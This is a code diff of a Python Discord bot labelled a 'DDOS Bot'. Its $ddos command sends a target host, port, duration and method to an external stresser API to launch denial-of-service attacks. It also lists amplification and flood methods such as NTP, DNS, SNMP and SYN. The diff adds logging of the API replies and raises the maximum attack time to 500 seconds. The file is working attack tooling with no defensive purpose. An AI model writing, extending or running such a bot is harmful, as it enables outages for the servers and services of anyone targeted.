@@ -1,5 +1,8 @@
 token = ""
 api = ""
+'''
+Writing log to file -- 4/16/2021
+'''
 
 import datetime
 import aiohttp
@@ -15,6 +18,8 @@ from discord.ext import commands
 import discord
 import json
 import os
+
+log = open("log.txt", "w")
 
 prefix = ["$"]
 start_time = datetime.datetime.utcnow()
@@ -39,8 +44,8 @@ async def on_ready():
 
 @bot.command()
 async def methods (ctx):
-    embed=discord.Embed(title="BEAMED DDOS BOT METHODS", description="HOME \n STOMP \n PLAIN \n ACK \n SNMP \n PLEX \n STUN \n NTP \n DNS \n DVR \n FIVEM \n HYDRA \n CPU \n TCP \n EQUINOX \n 100UP \n NFO \n OVH \n WRA \n SYN \n ODIN \n JENKINS \n GUNTHER \n HTTP \n HTTPv2", color=0xd20f0f)
-    embed.set_footer(text=f"Max time = 300\n Max Concurrents = 4")   
+    embed=discord.Embed(title="Beamed DDOS Bot Methods", description="HOME \n STOMP \n PLAIN \n ACK \n SNMP \n PLEX \n STUN \n NTP \n DNS \n DVR \n FIVEM \n HYDRA \n CPU \n TCP \n EQUINOX")
+    embed.set_footer(text=f"Max time = 500\n Max Concurrents = 4")
     await ctx.send(embed=embed)
 
 @bot.command(name='ddos')
@@ -50,25 +55,25 @@ async def ddos(ctx, arg1, arg2, arg3:int, arg4):
  channel123 = bot.get_channel(821167495293435934)
  try:
     async with aiohttp.ClientSession() as session:
-        async with session.get(f"https://{api}&host={arg1}&port={arg2}&time={arg3}&method={arg4}") as r: 
+        async with session.get(f"https://{api}&host={arg1}&port={arg2}&time={arg3}&method={arg4}") as r:
             b = await r.text()
-            print(b)
+            print(b);log.write(b)
             message = await ctx.send("**looking up host**")
             await asyncio.sleep(2)
             await message.edit(content=f"**loading lists**")
             await asyncio.sleep(2)
             await message.edit(content=f"**sending packets**")
             await asyncio.sleep(1)
-            embed = discord.Embed(title='**Attack has been sent! (ROCKET)**', color=0x2f3136)
+            embed = discord.Embed(title='**Attack has been sent! (ROCKET API)**', color=0x2f3136)
             embed.set_thumbnail(
                 url=ctx.guild.icon_url)
             embed.add_field(name='**Host**', value=f"``{arg1}``", inline=False)
             embed.add_field(name='**Port**', value=f"``{arg2}``", inline=False)
             embed.add_field(name='**Time**', value=f"``{arg3}``", inline=False)
             embed.add_field(name="**Method**", value=f"``{arg4}``", inline=False)
-            embed.set_footer(text=f"Attack was sent by {ctx.author.name}#{ctx.author.discriminator}")   
-            await ctx.send(embed=embed)  
-            await channel123.send(f"{b} was sent by {ctx.author.name}#{ctx.author.discriminator}")   
+            embed.set_footer(text=f"Attack was sent by {ctx.author.name}#{ctx.author.discriminator}")
+            await ctx.send(embed=embed)
+            await channel123.send(f"{b} was sent by {ctx.author.name}#{ctx.author.discriminator}")
  except:
      await ctx.send("error")
 
